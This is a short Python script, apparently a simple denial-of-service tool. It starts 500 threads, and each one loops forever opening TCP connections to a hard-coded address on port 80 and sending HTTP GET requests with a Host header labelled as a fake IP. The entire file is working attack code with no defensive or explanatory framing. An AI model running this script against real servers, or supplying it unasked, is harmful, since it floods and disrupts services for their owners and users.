#!/usr/bin/env python3

import threading
import socket

target = '192.168.40.254'
port = 80
fake_ip = '10.1.1.4'

connections =0

def attack():
    global connections
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target, port))
            s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'),(target, port))
            s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'),(target, port))
        except Exception as e:
            print("error during attack", e)
        finally:
            s.close()

        connections += 1
        print(str(connections) + " connections")

for i in range(500):
    thread = threading.Thread(target = attack)
    thread.start()